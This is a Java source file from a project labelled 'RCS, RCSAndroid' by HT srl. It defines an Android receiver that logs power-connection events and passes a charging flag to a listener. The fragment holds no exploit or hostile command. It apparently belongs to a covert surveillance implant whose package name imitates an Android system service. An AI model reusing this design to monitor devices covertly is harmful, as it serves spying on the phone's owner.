/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSAndroid
 * File         : BroadcastMonitorAc.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.service.listener;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

import com.android.service.Ac;

public class BroadcastMonitorAc extends BroadcastReceiver {
	/** The Constant TAG. */
	private static final String TAG = "BroadcastMonitorAc";

	/* (non-Javadoc)
	 * @see android.content.BroadcastReceiver#onReceive(android.content.Context, android.content.Intent)
	 */
	@Override
	public void onReceive(Context context, Intent intent) {
		Log.d("QZ", TAG + " power notification, action: " + intent.getAction());
		
		boolean plugged = intent.getAction().equals(Intent.ACTION_POWER_CONNECTED);
		
		ListenerAc.self().dispatch(new Ac(plugged));
	}
}